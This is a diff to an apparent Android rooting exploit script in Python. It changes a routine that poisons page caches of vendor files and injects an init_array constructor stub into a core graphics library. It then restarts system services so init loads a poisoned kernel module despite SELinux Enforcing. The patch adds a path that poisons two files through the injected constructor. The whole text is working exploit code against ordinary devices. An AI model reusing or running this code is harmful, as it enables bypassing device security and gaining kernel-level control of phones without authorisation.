@@ -571,15 +571,18 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         ok(f"cfg patched  ({sum(1 for i in range(len(cfg_want)) if cfg_want[i]!=cfg_cur[i])} diff bytes)")
 
         banner("POISON  (shell -> page caches)")
-        # carrier (rdbg, vendor_file): via init_array ctor injected into a trackingservice lib.
-        # NOTE the inject lib (e.g. libgralloc.qti) is a CORE lib loaded by many graphics procs, so
-        # this poison is reverted the instant the ctor has done its job (see EARLY REVERT below) to
-        # keep the blast radius to a few seconds and off the module-load path.
-        step("inject-lib stub  (init_array[0] -> 1-file carrier poison in the gap)")
-        eva_raw, eva_spec, cnts = build_inject_stub(tgt, port,
-            [(carrier["device_path"], carrier_cur, carrier_want)])
+        # The carrier is vendor_file (shell can't read it under Enforcing) so it's poisoned by an
+        # init_array ctor in a trackingservice-mapped lib. If the cfg is ALSO not shell-readable under
+        # Enforcing (Q3 family), the ctor poisons it too (2-file); otherwise shell poisons it directly
+        # (QPro/Q2). The inject lib is reverted the instant the ctor has run (EARLY REVERT below).
+        shell_cfg = bool(cfg.get("shell_poison_under_enforcing"))
+        inj_files = [(carrier["device_path"], carrier_cur, carrier_want)]
+        if not shell_cfg:
+            inj_files.append((cfg["device_path"], cfg_cur, cfg_want))
+        step(f"inject-lib stub  (init_array[0] -> {len(inj_files)}-file poison in the gap)")
+        eva_raw, eva_spec, cnts = build_inject_stub(tgt, port, inj_files)
         eva_stub_len = len(eva_raw)
-        info(f"stub {len(eva_raw)}B  (carrier IVs={cnts[0]})  gap fits {inj(tgt)['stub_gap_size']}B")
+        info(f"stub {len(eva_raw)}B  (IVs={cnts})  gap fits {inj(tgt)['stub_gap_size']}B")
         poison(adb, inj(tgt)["device_path"], eva_spec, "inject")
         step("libandroid_servers::dump stub  (-> ctl.restart trackingservice)")
         las_raw, las_spec = build_libas_stub(tgt)
@@ -608,14 +611,17 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         step("Reverting inject-lib + libandroid poison (ctor done; before module load)")
         do_revert()
 
-        # cfg: shell-readable under Enforcing on this target -> poison directly from shell, LATE
-        # (right before the trigger) so the single 227B cfg page isn't evicted during the settle.
-        step("init.insmod.cfg  (shell-direct; readable under Enforcing here)")
-        adb.sh(f"cat {cfg['device_path']} >/dev/null 2>&1")   # prime page cache
-        off = hx(cfg["inject_off"]); ln = cfg["inject_len"]
-        cfg_spec = bytearray()
-        for i in range(off, off + ln): cfg_spec += struct.pack("<I", i) + bytes([cfg_want[i]])
-        poison(adb, cfg["device_path"], bytes(cfg_spec), "cfg")
+        if shell_cfg:
+            # cfg shell-readable under Enforcing here -> poison directly from shell, LATE (right before
+            # the trigger) so the single cfg page isn't evicted during the settle.
+            step("init.insmod.cfg  (shell-direct; readable under Enforcing here)")
+            adb.sh(f"cat {cfg['device_path']} >/dev/null 2>&1")   # prime page cache
+            off = hx(cfg["inject_off"]); ln = cfg["inject_len"]
+            cfg_spec = bytearray()
+            for i in range(off, off + ln): cfg_spec += struct.pack("<I", i) + bytes([cfg_want[i]])
+            poison(adb, cfg["device_path"], bytes(cfg_spec), "cfg")
+        else:
+            info("init.insmod.cfg was poisoned by the 2-file ctor (not shell-readable under Enforcing)")
 
         step(f"setprop ctl.start {isvc}  ->  init finit_modules the poisoned carrier")
         adb.sh(f"setprop ctl.start {isvc}")
